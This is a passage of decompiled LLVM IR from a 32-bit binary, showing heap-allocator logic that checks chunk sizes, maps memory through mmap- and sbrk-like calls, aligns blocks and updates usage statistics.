  store i32 %v0_8050835, i32* %v4_8050835, align 4
  %v0_8050838 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050838 = load i32, i32* @edx, align 4
  %v2_8050838 = add i32 %v1_8050838, 4
  %v3_8050838 = inttoptr i32 %v2_8050838 to i32*
  store i32 %v0_8050838, i32* %v3_8050838, align 4
  br label %dec_label_pc_805083b

dec_label_pc_805083b:                             ; preds = %dec_label_pc_80507f5, %dec_label_pc_8050824
  %v0_805083b = load i32, i32* %ecx.global-to-local, align 4
  %v1_805083b = add i32 %v0_805083b, 8
  store i32 %v1_805083b, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050c3d

dec_label_pc_8050843.loopexit:                    ; preds = %dec_label_pc_8050790
  br label %dec_label_pc_8050843

dec_label_pc_8050843:                             ; preds = %dec_label_pc_8050843.loopexit, %dec_label_pc_805054b, %dec_label_pc_8050553
  %v0_8050843 = load i32, i32* @global_var_805336c.189, align 4
  store i32 %v0_8050843, i32* @ebx, align 4
  %v1_805084d = add i32 %v1_80508d8, 16
  store i32 %v1_805084d, i32* @esi, align 4
  %v1_8050850 = add i32 %v0_8050843, 4
  %v2_8050850 = inttoptr i32 %v1_8050850 to i32*
  %v3_8050850 = load i32, i32* %v2_8050850, align 4
  %v1_8050857 = and i32 %v3_8050850, -4
  store i32 %v1_8050857, i32* %ecx.global-to-local, align 4
  %v7_805085a = icmp ult i32 %v1_8050857, %v1_805084d
  br i1 %v7_805085a, label %dec_label_pc_805087a, label %dec_label_pc_805085e

dec_label_pc_805085e:                             ; preds = %dec_label_pc_8050843
  %v2_8050862 = add i32 %v0_8050843, %v1_80508d8
  store i32 %v2_8050862, i32* @edx, align 4
  %v1_8050865 = or i32 %v1_80508d8, 1
  store i32 %v1_8050865, i32* %eax.global-to-local, align 4
  store i32 %v2_8050862, i32* @global_var_805336c.189, align 4
  store i32 %v1_8050865, i32* %v2_8050850, align 4
  %v0_8050871 = load i32, i32* %ecx.global-to-local, align 4
  %v5_8050871 = sub i32 %v0_8050871, %v1_80508d8
  store i32 %v5_8050871, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050bcd

dec_label_pc_805087a:                             ; preds = %dec_label_pc_8050843
  %v0_805087a = load i32, i32* @global_var_805369c.194, align 4
  store i32 %v0_805087a, i32* %edx.global-to-local, align 4
  %v0_8050880 = load i8, i8* @global_var_8053340.188, align 64
  %v1_8050880 = and i8 %v0_8050880, 2
  %v2_8050880 = icmp eq i8 %v1_8050880, 0
  br i1 %v2_8050880, label %dec_label_pc_80508ae, label %dec_label_pc_8050889

dec_label_pc_8050889:                             ; preds = %dec_label_pc_805087a
  store i32 ptrtoint (i8* @global_var_8053340.188 to i32), i32* %stack_var_-92, align 4
  %v2_8050891 = call i32 @function_8051101(i32* bitcast (i8* @global_var_8053340.188 to i32*))
  store i32 ptrtoint (i8* @global_var_8053340.188 to i32), i32* @ebx, align 4
  %v1_805089b = add i32 %v1_80508d8, -7
  store i32 %v1_805089b, i32* %eax.global-to-local, align 4
  store i32 %v1_805089b, i32* %stack_var_-92, align 4
  %v1_805089f = call i32 @function_80504e4(i32 %v1_805089b)
  store i32 %v1_805089f, i32* %eax.global-to-local, align 4
  store i32 %v1_805089f, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050c3d

dec_label_pc_80508ae:                             ; preds = %dec_label_pc_805087a
  %v1_80508ae = add i32 %v0_805087a, -1
  store i32 %v1_80508ae, i32* @ecx, align 4
  store i32 %v1_80508d8, i32* @ebx, align 4
  %v1_80508b9 = load i32, i32* @global_var_805368c.195, align 4
  %v7_80508b9 = icmp ult i32 %v1_80508d8, %v1_80508b9
  br i1 %v7_80508b9, label %dec_label_pc_805097b, label %dec_label_pc_80508c5

dec_label_pc_80508c5:                             ; preds = %dec_label_pc_80508ae
  %v0_80508c5 = load i32, i32* @global_var_8053690.196, align 16
  store i32 %v0_80508c5, i32* %eax.global-to-local, align 4
  %v1_80508ca = load i32, i32* @global_var_8053694.197, align 4
  %v5_80508d0 = icmp slt i32 %v0_80508c5, %v1_80508ca
  br i1 %v5_80508d0, label %dec_label_pc_80508d6, label %dec_label_pc_805097b

dec_label_pc_80508d6:                             ; preds = %dec_label_pc_80508c5
  %v2_80508d8 = add i32 %v1_80508d8, 10
  %v3_80508d8 = add i32 %v2_80508d8, %v0_805087a
  %v1_80508dc = sub i32 0, %v0_805087a
  store i32 %v1_80508dc, i32* %eax.global-to-local, align 4
  %v2_80508de = and i32 %v3_80508d8, %v1_80508dc
  store i32 %v2_80508de, i32* @ebx, align 4
  %tmp128 = icmp ugt i32 %v2_80508de, %v1_80508d8
  br i1 %tmp128, label %dec_label_pc_80508ea, label %dec_label_pc_805097b

dec_label_pc_80508ea:                             ; preds = %dec_label_pc_80508d6
  store i32 0, i32* %stack_var_-92, align 4
  %v8_80508f7 = call i32 @function_8051d28(i32 0, i32 %v2_80508de, i32 3, i32 34, i32 0, i32 0, i32 %v1_80508ae, i32 %v1_80508ae)
  store i32 %v8_80508f7, i32* %eax.global-to-local, align 4
  store i32 %v8_80508f7, i32* @edx, align 4
  %v10_8050901 = icmp eq i32 %v8_80508f7, -1
  br i1 %v10_8050901, label %dec_label_pc_80508ea.dec_label_pc_805097b_crit_edge, label %dec_label_pc_8050906

dec_label_pc_80508ea.dec_label_pc_805097b_crit_edge: ; preds = %dec_label_pc_80508ea
  %v0_805097b.pre = load i32, i32* @global_var_805336c.189, align 4
  br label %dec_label_pc_805097b

dec_label_pc_8050906:                             ; preds = %dec_label_pc_80508ea
  %v1_8050908 = urem i32 %v8_80508f7, 8
  %v2_8050908 = icmp eq i32 %v1_8050908, 0
  store i32 %v1_8050908, i32* %ecx.global-to-local, align 4
  br i1 %v2_8050908, label %dec_label_pc_8050920, label %dec_label_pc_805090d

dec_label_pc_805090d:                             ; preds = %dec_label_pc_8050906
  %v0_8050912 = load i32, i32* @ebx, align 4
  %v2_8050914 = sub nsw i32 8, %v1_8050908
  store i32 %v2_8050914, i32* %eax.global-to-local, align 4
  %v2_8050916 = add i32 %v2_8050914, %v8_80508f7
  store i32 %v2_8050916, i32* @edx, align 4
  %v2_8050918 = sub i32 %v0_8050912, %v2_8050914
  store i32 %v2_8050918, i32* %esi.global-to-local, align 4
  %v2_805091a = inttoptr i32 %v2_8050916 to i32*
  store i32 %v2_8050914, i32* %v2_805091a, align 4
  br label %dec_label_pc_8050928

dec_label_pc_8050920:                             ; preds = %dec_label_pc_8050906
  %v1_8050920 = inttoptr i32 %v8_80508f7 to i32*
  store i32 0, i32* %v1_8050920, align 4
  br label %dec_label_pc_8050928

dec_label_pc_8050928:                             ; preds = %dec_label_pc_805090d, %dec_label_pc_8050920
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_805090d ], [ @ebx, %dec_label_pc_8050920 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_8050928 = or i32 %storemerge, 2
  %v1_805092b = load i32, i32* @edx, align 4
  %v2_805092b = add i32 %v1_805092b, 4
  %v3_805092b = inttoptr i32 %v2_805092b to i32*
  store i32 %v1_8050928, i32* %v3_805092b, align 4
  %v0_805092e = load i32, i32* @global_var_8053690.196, align 16
  %v1_8050933 = add i32 %v0_805092e, 1
  store i32 %v1_8050933, i32* %eax.global-to-local, align 4
  store i32 %v1_8050933, i32* @global_var_8053690.196, align 16
  %v1_8050939 = load i32, i32* @global_var_8053698.198, align 8
  %v7_805093f = icmp sgt i32 %v1_8050933, %v1_8050939
  br i1 %v7_805093f, label %dec_label_pc_8050941, label %dec_label_pc_8050946

dec_label_pc_8050941:                             ; preds = %dec_label_pc_8050928
  store i32 %v1_8050933, i32* @global_var_8053698.198, align 8
  br label %dec_label_pc_8050946

dec_label_pc_8050946:                             ; preds = %dec_label_pc_8050928, %dec_label_pc_8050941
  %v0_8050946 = load i32, i32* @global_var_80536a4.199, align 4
  %v1_805094b = load i32, i32* @ebx, align 4
  %v2_805094b = add i32 %v1_805094b, %v0_8050946
  store i32 %v2_805094b, i32* %eax.global-to-local, align 4
  store i32 %v2_805094b, i32* @global_var_80536a4.199, align 4
  %v1_8050952 = load i32, i32* @global_var_80536b0.200, align 16
  %tmp129 = icmp ugt i32 %v2_805094b, %v1_8050952
  br i1 %tmp129, label %dec_label_pc_805095a, label %dec_label_pc_805095f

dec_label_pc_805095a:                             ; preds = %dec_label_pc_8050946
  store i32 %v2_805094b, i32* @global_var_80536b0.200, align 16
  br label %dec_label_pc_805095f

dec_label_pc_805095f:                             ; preds = %dec_label_pc_8050946, %dec_label_pc_805095a
  %v1_805095f = load i32, i32* @global_var_80536a8.201, align 8
  %v2_805095f = add i32 %v1_805095f, %v2_805094b
  store i32 %v2_805095f, i32* %eax.global-to-local, align 4
  %v1_8050965 = load i32, i32* @global_var_80536b4.202, align 4
  %tmp130 = icmp ugt i32 %v2_805095f, %v1_8050965
  br i1 %tmp130, label %dec_label_pc_8050971, label %dec_label_pc_80505c2

dec_label_pc_8050971:                             ; preds = %dec_label_pc_805095f
  store i32 %v2_805095f, i32* @global_var_80536b4.202, align 4
  br label %dec_label_pc_80505c2

dec_label_pc_805097b:                             ; preds = %dec_label_pc_80508d6, %dec_label_pc_80508ea.dec_label_pc_805097b_crit_edge, %dec_label_pc_80508c5, %dec_label_pc_80508ae
  %v0_805097b = phi i32 [ %v0_805097b.pre, %dec_label_pc_80508ea.dec_label_pc_805097b_crit_edge ], [ %v0_8050843, %dec_label_pc_80508c5 ], [ %v0_8050843, %dec_label_pc_80508d6 ], [ %v0_8050843, %dec_label_pc_80508ae ]
  store i32 %v0_805097b, i32* %eax.global-to-local, align 4
  %v1_8050984 = add i32 %v0_805097b, 4
  %v2_8050984 = inttoptr i32 %v1_8050984 to i32*
  %v3_8050984 = load i32, i32* %v2_8050984, align 4
  %v1_805098e = and i32 %v3_8050984, -4
  %v2_805098e = icmp eq i32 %v1_805098e, 0
  store i32 %v1_805098e, i32* @ebp, align 4
  %v1_8050991 = load i32, i32* @global_var_8053688.203, align 8
  %v2_8050991 = add i32 %v1_8050991, %v1_805084d
  store i32 %v2_8050991, i32* %eax.global-to-local, align 4
  %v0_8050997 = load i8, i8* @global_var_80536a0.204, align 32
  %v1_8050997 = urem i8 %v0_8050997, 2
  %v2_8050997 = icmp eq i8 %v1_8050997, 0
  br i1 %v2_8050997, label %dec_label_pc_80509a2, label %dec_label_pc_80509a0

dec_label_pc_80509a0:                             ; preds = %dec_label_pc_805097b
  %v2_80509a0 = sub i32 %v2_8050991, %v1_805098e
  store i32 %v2_80509a0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80509a2

dec_label_pc_80509a2:                             ; preds = %dec_label_pc_805097b, %dec_label_pc_80509a0
  %v0_80509a6 = phi i32 [ %v2_8050991, %dec_label_pc_805097b ], [ %v2_80509a0, %dec_label_pc_80509a0 ]
  %v5_80509a6 = add i32 %v0_80509a6, %v1_80508ae
  store i32 %v5_80509a6, i32* %eax.global-to-local, align 4
  %v1_80509aa = sub i32 0, %v0_805087a
  store i32 %v1_80509aa, i32* @edx, align 4
  %v2_80509b2 = and i32 %v5_80509a6, %v1_80509aa
  store i32 %v2_80509b2, i32* @esi, align 4
  %tmp91 = icmp slt i32 %v2_80509b2, 1
  br i1 %tmp91, label %dec_label_pc_80509cc, label %dec_label_pc_80509b6

dec_label_pc_80509b6:                             ; preds = %dec_label_pc_80509a2
  store i32 %v2_80509b2, i32* %stack_var_-92, align 4
  %v1_80509ba = call i32 @function_80521d9(i32 %v2_80509b2)
  store i32 %v1_80509ba, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  store i32 %v1_80509ba, i32* @ebx, align 4
  %v10_80509c7 = icmp eq i32 %v1_80509ba, -1
  %v1_80509ca = icmp eq i1 %v10_80509c7, false
  br i1 %v1_80509ca, label %dec_label_pc_8050a22.dec_label_pc_8050a2b_crit_edge, label %dec_label_pc_80509b6.dec_label_pc_80509cc_crit_edge

dec_label_pc_80509b6.dec_label_pc_80509cc_crit_edge: ; preds = %dec_label_pc_80509b6
  %v0_80509cc.pre = load i8, i8* @global_var_80536a0.204, align 32
  br label %dec_label_pc_80509cc

dec_label_pc_80509cc:                             ; preds = %dec_label_pc_80509b6.dec_label_pc_80509cc_crit_edge, %dec_label_pc_80509a2
  %v0_80509f8 = phi i32 [ -1, %dec_label_pc_80509b6.dec_label_pc_80509cc_crit_edge ], [ %v1_80509aa, %dec_label_pc_80509a2 ]
  %v0_80509cc = phi i8 [ %v0_80509cc.pre, %dec_label_pc_80509b6.dec_label_pc_80509cc_crit_edge ], [ %v0_8050997, %dec_label_pc_80509a2 ]
  %v1_80509cc = urem i8 %v0_80509cc, 2
  %v2_80509cc = icmp eq i8 %v1_80509cc, 0
  br i1 %v2_80509cc, label %dec_label_pc_80509cc.dec_label_pc_80509e1_crit_edge, label %dec_label_pc_80509d5

dec_label_pc_80509cc.dec_label_pc_80509e1_crit_edge: ; preds = %dec_label_pc_80509cc
  %v0_80509e1.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80509e1

dec_label_pc_80509d5:                             ; preds = %dec_label_pc_80509cc
  %v2_80509d9 = add i32 %v1_805098e, %v1_80508ae
  store i32 %v2_80509d9, i32* %eax.global-to-local, align 4
  %v0_80509db = load i32, i32* @esi, align 4
  %v2_80509db = add i32 %v0_80509db, %v2_80509d9
  %v5_80509dd = and i32 %v2_80509db, %v1_80509aa
  store i32 %v5_80509dd, i32* @esi, align 4
  br label %dec_label_pc_80509e1

dec_label_pc_80509e1:                             ; preds = %dec_label_pc_80509cc.dec_label_pc_80509e1_crit_edge, %dec_label_pc_80509d5
  %v0_80509e1 = phi i32 [ %v0_80509e1.pre, %dec_label_pc_80509cc.dec_label_pc_80509e1_crit_edge ], [ %v5_80509dd, %dec_label_pc_80509d5 ]
  %tmp131 = icmp ult i32 %v0_80509e1, 1048576
  br i1 %tmp131, label %dec_label_pc_80509e9, label %dec_label_pc_80509ee

dec_label_pc_80509e9:                             ; preds = %dec_label_pc_80509e1
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_80509ee

dec_label_pc_80509ee:                             ; preds = %dec_label_pc_80509e1, %dec_label_pc_80509e9
  %v0_8050a02 = phi i32 [ %v0_80509e1, %dec_label_pc_80509e1 ], [ 1048576, %dec_label_pc_80509e9 ]
  %tmp132 = icmp ugt i32 %v0_8050a02, %v1_80508d8
  br i1 %tmp132, label %dec_label_pc_80509f8, label %dec_label_pc_8050c30

dec_label_pc_80509f8:                             ; preds = %dec_label_pc_80509ee
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8050a05 = call i32 @function_8051d28(i32 0, i32 %v0_8050a02, i32 3, i32 34, i32 0, i32 0, i32 %v0_80509f8, i32 %v0_80509f8)
  store i32 %v8_8050a05, i32* %eax.global-to-local, align 4
  store i32 %v8_8050a05, i32* @ebx, align 4
  %v10_8050a0f = icmp eq i32 %v8_8050a05, -1
  br i1 %v10_8050a0f, label %dec_label_pc_8050c30, label %dec_label_pc_8050a22.thread

dec_label_pc_8050a22.thread:                      ; preds = %dec_label_pc_80509f8
  %v0_8050a18 = load i8, i8* @global_var_80536a0.204, align 1
  %v2_8050a18 = and i8 %v0_8050a18, -2
  store i8 %v2_8050a18, i8* @global_var_80536a0.204, align 32
  %v1_8050a1f = load i32, i32* @esi, align 4
  %v2_8050a1f = add i32 %v1_8050a1f, %v8_8050a05
  store i32 %v2_8050a1f, i32* @edx, align 4
  br label %dec_label_pc_8050a2b

dec_label_pc_8050a22.dec_label_pc_8050a2b_crit_edge: ; preds = %dec_label_pc_80509b6
  %v1_8050a2f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050a2b

dec_label_pc_8050a2b:                             ; preds = %dec_label_pc_8050a22.dec_label_pc_8050a2b_crit_edge, %dec_label_pc_8050a22.thread
  %v1_8050a2f = phi i32 [ %v1_8050a1f, %dec_label_pc_8050a22.thread ], [ %v1_8050a2f.pre, %dec_label_pc_8050a22.dec_label_pc_8050a2b_crit_edge ]
  %v0_8050af794 = phi i32 [ %v8_8050a05, %dec_label_pc_8050a22.thread ], [ %v1_80509ba, %dec_label_pc_8050a22.dec_label_pc_8050a2b_crit_edge ]
  %v0_8050ae993 = phi i32 [ %v2_8050a1f, %dec_label_pc_8050a22.thread ], [ -1, %dec_label_pc_8050a22.dec_label_pc_8050a2b_crit_edge ]
  %v0_8050a2f = load i32, i32* @global_var_80536a8.201, align 8
  %v2_8050a2f = add i32 %v1_8050a2f, %v0_8050a2f
  store i32 %v2_8050a2f, i32* @global_var_80536a8.201, align 8
  %v2_8050a35 = add i32 %v1_805098e, %v0_805097b
  store i32 %v2_8050a35, i32* %ecx.global-to-local, align 4
  %v2_8050a37 = sub i32 %v0_8050af794, %v2_8050a35
  %v7_8050a37 = icmp ult i32 %v0_8050af794, %v2_8050a35
  %v12_8050a37 = icmp eq i32 %v2_8050a37, 0
  %v1_8050a39 = icmp eq i1 %v12_8050a37, false
  br i1 %v1_8050a39, label %dec_label_pc_8050a52, label %dec_label_pc_8050a3b

dec_label_pc_8050a3b:                             ; preds = %dec_label_pc_8050a2b
  %v10_8050a3b = icmp eq i32 %v0_8050ae993, -1
  %v1_8050a3e = icmp eq i1 %v10_8050a3b, false
  br i1 %v1_8050a3e, label %dec_label_pc_8050a52, label %dec_label_pc_8050a40

dec_label_pc_8050a40:                             ; preds = %dec_label_pc_8050a3b
  %v2_8050a40 = add i32 %v1_8050a2f, %v1_805098e
  store i32 %v0_805097b, i32* %ecx.global-to-local, align 4
  %v1_8050a47 = or i32 %v2_8050a40, 1
  store i32 %v1_8050a47, i32* %eax.global-to-local, align 4
  store i32 %v1_8050a47, i32* %v2_8050984, align 4
  br label %dec_label_pc_8050b7f

dec_label_pc_8050a52:                             ; preds = %dec_label_pc_8050a3b, %dec_label_pc_8050a2b
  %v0_8050a52 = load i8, i8* @global_var_80536a0.204, align 1
  %v1_8050a52 = sext i8 %v0_8050a52 to i32
  store i32 %v1_8050a52, i32* %eax.global-to-local, align 4
  %v2_8050a57 = urem i8 %v0_8050a52, 2
  %v3_8050a57 = icmp eq i8 %v2_8050a57, 0
  br i1 %v3_8050a57, label %dec_label_pc_8050a6b, label %dec_label_pc_8050a5b

dec_label_pc_8050a5b:                             ; preds = %dec_label_pc_8050a52
  br i1 %v2_805098e, label %dec_label_pc_8050a6b, label %dec_label_pc_8050a5f

dec_label_pc_8050a5f:                             ; preds = %dec_label_pc_8050a5b
  %v1_8050a61 = icmp eq i1 %v7_8050a37, false
  br i1 %v1_8050a61, label %dec_label_pc_8050a6b, label %dec_label_pc_8050a63

dec_label_pc_8050a63:                             ; preds = %dec_label_pc_8050a5f
  %v1_8050a63 = and i32 %v1_8050a52, -2
  %v4_8050a63 = trunc i32 %v1_8050a63 to i8
  store i32 %v1_8050a63, i32* %eax.global-to-local, align 4
  store i8 %v4_8050a63, i8* @global_var_80536a0.204, align 32
  br label %dec_label_pc_8050a6b

dec_label_pc_8050a6b:                             ; preds = %dec_label_pc_8050a5f, %dec_label_pc_8050a5b, %dec_label_pc_8050a52, %dec_label_pc_8050a63
  %v0_8050a6b = phi i8 [ %v0_8050a52, %dec_label_pc_8050a5f ], [ %v0_8050a52, %dec_label_pc_8050a5b ], [ %v0_8050a52, %dec_label_pc_8050a52 ], [ %v4_8050a63, %dec_label_pc_8050a63 ]
  %v1_8050a6b = urem i8 %v0_8050a6b, 2
  %v2_8050a6b = icmp eq i8 %v1_8050a6b, 0
  br i1 %v2_8050a6b, label %dec_label_pc_8050ae9, label %dec_label_pc_8050a74

dec_label_pc_8050a74:                             ; preds = %dec_label_pc_8050a6b
  br i1 %v2_805098e, label %dec_label_pc_8050a82, label %dec_label_pc_8050a78

dec_label_pc_8050a78:                             ; preds = %dec_label_pc_8050a74
  store i32 %v2_8050a37, i32* %eax.global-to-local, align 4
  %v2_8050a7c = add i32 %v2_8050a2f, %v2_8050a37
  store i32 %v2_8050a7c, i32* @global_var_80536a8.201, align 8
  br label %dec_label_pc_8050a82

dec_label_pc_8050a82:                             ; preds = %dec_label_pc_8050a74, %dec_label_pc_8050a78
  %v1_8050a84 = urem i32 %v0_8050af794, 8
  %v2_8050a84 = icmp eq i32 %v1_8050a84, 0
  store i32 %v1_8050a84, i32* %edx.global-to-local, align 4
  %v1_8050a87 = icmp eq i1 %v2_8050a84, false
  br i1 %v1_8050a87, label %dec_label_pc_8050a8f, label %dec_label_pc_8050a89

dec_label_pc_8050a89:                             ; preds = %dec_label_pc_8050a82
  store i32 %v0_8050af794, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050a99

dec_label_pc_8050a8f:                             ; preds = %dec_label_pc_8050a82
  %v2_8050a94 = sub nsw i32 8, %v1_8050a84
  store i32 %v2_8050a94, i32* %eax.global-to-local, align 4
  %v2_8050a96 = add i32 %v2_8050a94, %v0_8050af794
  store i32 %v2_8050a96, i32* @edi, align 4
  br label %dec_label_pc_8050a99

dec_label_pc_8050a99:                             ; preds = %dec_label_pc_8050a89, %dec_label_pc_8050a8f
  %v0_8050a9c = phi i32 [ 0, %dec_label_pc_8050a89 ], [ %v2_8050a94, %dec_label_pc_8050a8f ]
  %v2_8050a99 = add i32 %v1_8050a2f, %v0_8050af794
  %v2_8050a9c = add i32 %v0_8050a9c, %v1_805098e
  store i32 %v2_8050a9c, i32* %ecx.global-to-local, align 4
  %v2_8050aa5 = add i32 %v2_8050a9c, %v2_8050a99
  store i32 %v2_8050aa5, i32* %edx.global-to-local, align 4
  %v2_8050aab = add i32 %v2_8050aa5, %v1_80508ae
  %v5_8050aae = and i32 %v2_8050aab, %v1_80509aa
  %v2_8050ab5 = sub i32 %v5_8050aae, %v2_8050aa5
  store i32 %v2_8050ab5, i32* %eax.global-to-local, align 4
  %v2_8050ab7 = add i32 %v2_8050ab5, %v2_8050a9c
  store i32 %v2_8050ab7, i32* @esi, align 4
  store i32 %v2_8050ab7, i32* %stack_var_-92, align 4
  %v1_8050abb = call i32 @function_80521d9(i32 %v2_8050ab7)
  store i32 %v1_8050abb, i32* %eax.global-to-local, align 4
  store i32 %v1_8050abb, i32* @edx, align 4
  %v10_8050ac5 = icmp eq i32 %v1_8050abb, -1
  %v1_8050ac8 = icmp eq i1 %v10_8050ac5, false
  br i1 %v1_8050ac8, label %dec_label_pc_8050ad8, label %dec_label_pc_8050aca

dec_label_pc_8050aca:                             ; preds = %dec_label_pc_8050a99
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8050acf = call i32 @function_80521d9(i32 0)
  store i32 %v1_8050acf, i32* %eax.global-to-local, align 4
  store i32 %v1_8050acf, i32* @edx, align 4
  br label %dec_label_pc_8050b0c

dec_label_pc_8050ad8:                             ; preds = %dec_label_pc_8050a99
  %v1_8050ad8 = load i32, i32* @ebx, align 4
  %v7_8050ad8 = icmp ult i32 %v1_8050abb, %v1_8050ad8
  %v1_8050ada = icmp eq i1 %v7_8050ad8, false
  br i1 %v1_8050ada, label %dec_label_pc_8050b11, label %dec_label_pc_8050adc

dec_label_pc_8050adc:                             ; preds = %dec_label_pc_8050ad8
  %v0_8050adc = load i8, i8* @global_var_80536a0.204, align 1
  %v2_8050adc = and i8 %v0_8050adc, -2
  store i8 %v2_8050adc, i8* @global_var_80536a0.204, align 32
  store i32 %v2_8050a99, i32* @edx, align 4
  br label %dec_label_pc_8050af0

dec_label_pc_8050ae9:                             ; preds = %dec_label_pc_8050a6b
  %v10_8050ae9 = icmp eq i32 %v0_8050ae993, -1
  br i1 %v10_8050ae9, label %dec_label_pc_8050af4, label %dec_label_pc_8050aee

dec_label_pc_8050aee:                             ; preds = %dec_label_pc_8050ae9
  store i32 %v0_8050af794, i32* @edi, align 4
  br label %dec_label_pc_8050af0

dec_label_pc_8050af0:                             ; preds = %dec_label_pc_8050adc, %dec_label_pc_8050aee
  %v0_8050b1158 = phi i32 [ %v2_8050a99, %dec_label_pc_8050adc ], [ %v0_8050ae993, %dec_label_pc_8050aee ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8050b11

dec_label_pc_8050af4:                             ; preds = %dec_label_pc_8050ae9
  store i32 %v0_8050af794, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8050afb = call i32 @function_80521d9(i32 0)
  store i32 %v1_8050afb, i32* @edx, align 4
  %v1_8050b02 = load i32, i32* @ebx, align 4
  %v2_8050b02 = sub i32 %v1_8050afb, %v1_8050b02
  %v1_8050b04 = load i32, i32* @esi, align 4
  %v2_8050b04 = sub i32 %v2_8050b02, %v1_8050b04
  store i32 %v2_8050b04, i32* %eax.global-to-local, align 4
  %v0_8050b06 = load i32, i32* @global_var_80536a8.201, align 8
  %v2_8050b06 = add i32 %v0_8050b06, %v2_8050b04
  store i32 %v2_8050b06, i32* @global_var_80536a8.201, align 8
  br label %dec_label_pc_8050b0c

dec_label_pc_8050b0c:                             ; preds = %dec_label_pc_8050aca, %dec_label_pc_8050af4
  %v0_8050b1157 = phi i32 [ %v1_8050acf, %dec_label_pc_8050aca ], [ %v1_8050afb, %dec_label_pc_8050af4 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8050b11

dec_label_pc_8050b11:                             ; preds = %dec_label_pc_8050ad8, %dec_label_pc_8050af0, %dec_label_pc_8050b0c
  %v0_8050b16 = phi i32 [ %v1_8050abb, %dec_label_pc_8050ad8 ], [ %v0_8050b1158, %dec_label_pc_8050af0 ], [ %v0_8050b1157, %dec_label_pc_8050b0c ]
  %v10_8050b11 = icmp eq i32 %v0_8050b16, -1
  br i1 %v10_8050b11, label %dec_label_pc_8050b7f, label %dec_label_pc_8050b16

dec_label_pc_8050b16:                             ; preds = %dec_label_pc_8050b11
  %v1_8050b16 = load i32, i32* @edi, align 4
  %v2_8050b16 = sub i32 %v0_8050b16, %v1_8050b16
  store i32 %v2_8050b16, i32* @edx, align 4
  store i32 %v1_8050b16, i32* @global_var_805336c.189, align 4
  %v1_8050b1e = load i32, i32* @esi, align 4
  %v2_8050b1e = add i32 %v1_8050b1e, %v2_8050b16
  %v1_8050b21 = or i32 %v2_8050b1e, 1
  store i32 %v1_8050b21, i32* %eax.global-to-local, align 4
  %v2_8050b24 = add i32 %v1_8050b16, 4
  %v3_8050b24 = inttoptr i32 %v2_8050b24 to i32*
  store i32 %v1_8050b21, i32* %v3_8050b24, align 4
  %v0_8050b27 = load i32, i32* @global_var_80536a8.201, align 8
  %v1_8050b27 = load i32, i32* @esi, align 4
  %v2_8050b27 = add i32 %v1_8050b27, %v0_8050b27
  store i32 %v2_8050b27, i32* @global_var_80536a8.201, align 8
  br i1 %v2_805098e, label %dec_label_pc_8050b7f, label %dec_label_pc_8050b31

dec_label_pc_8050b31:                             ; preds = %dec_label_pc_8050b16
  %v1_8050b31 = add i32 %v1_805098e, -12
  store i32 %v0_805097b, i32* %ecx.global-to-local, align 4
  %v1_8050b38 = and i32 %v1_8050b31, -8
  store i32 %v1_8050b38, i32* %eax.global-to-local, align 4
  %v1_8050b3d = or i32 %v1_8050b38, 1
  store i32 %v1_8050b3d, i32* @edx, align 4
  %v5_8050b40 = icmp ult i32 %v1_8050b38, 15
  store i32 %v1_8050b3d, i32* %v2_8050984, align 4
  %v0_8050b46 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050b46 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050b46 = add i32 %v0_8050b46, 4
  %v3_8050b46 = add i32 %v2_8050b46, %v1_8050b46
  %v4_8050b46 = inttoptr i32 %v3_8050b46 to i32*
  store i32 5, i32* %v4_8050b46, align 4
  %v0_8050b4e = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050b4e = load i32, i32* %eax.global-to-local, align 4
  %v2_8050b4e = add i32 %v0_8050b4e, 8
  %v3_8050b4e = add i32 %v2_8050b4e, %v1_8050b4e
  %v4_8050b4e = inttoptr i32 %v3_8050b4e to i32*
  store i32 5, i32* %v4_8050b4e, align 4
  br i1 %v5_8050b40, label %dec_label_pc_8050b7f, label %dec_label_pc_8050b58

dec_label_pc_8050b58:                             ; preds = %dec_label_pc_8050b31
  %v0_8050b5b = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050b5d = add i32 %v0_8050b5b, 8
  store i32 %v1_8050b5d, i32* %eax.global-to-local, align 4
  %v0_8050b60 = load i32, i32* @global_var_8053684.205, align 4
  store i32 %v0_8050b60, i32* @ebx, align 4
  store i32 %v1_8050b5d, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8053684.205, align 4
  %v1_8050b71 = call i32 @function_80512a9(i32 %v1_8050b5d)
  store i32 %v1_8050b71, i32* %eax.global-to-local, align 4
  %v0_8050b76 = load i32, i32* @ebx, align 4
  store i32 %v0_8050b76, i32* @global_var_8053684.205, align 4
  br label %dec_label_pc_8050b7f

dec_label_pc_8050b7f:                             ; preds = %dec_label_pc_8050b31, %dec_label_pc_8050b16, %dec_label_pc_8050b11, %dec_label_pc_8050a40, %dec_label_pc_8050b58
  %v0_8050b7f = load i32, i32* @global_var_80536a8.201, align 8
  store i32 %v0_8050b7f, i32* %eax.global-to-local, align 4
  %v1_8050b84 = load i32, i32* @global_var_80536ac.206, align 4
  %tmp133 = icmp ugt i32 %v0_8050b7f, %v1_8050b84
  br i1 %tmp133, label %dec_label_pc_8050b8c, label %dec_label_pc_8050b91

dec_label_pc_8050b8c:                             ; preds = %dec_label_pc_8050b7f
  store i32 %v0_8050b7f, i32* @global_var_80536ac.206, align 4
  br label %dec_label_pc_8050b91

dec_label_pc_8050b91:                             ; preds = %dec_label_pc_8050b7f, %dec_label_pc_8050b8c
  %v1_8050b91 = load i32, i32* @global_var_80536a4.199, align 4
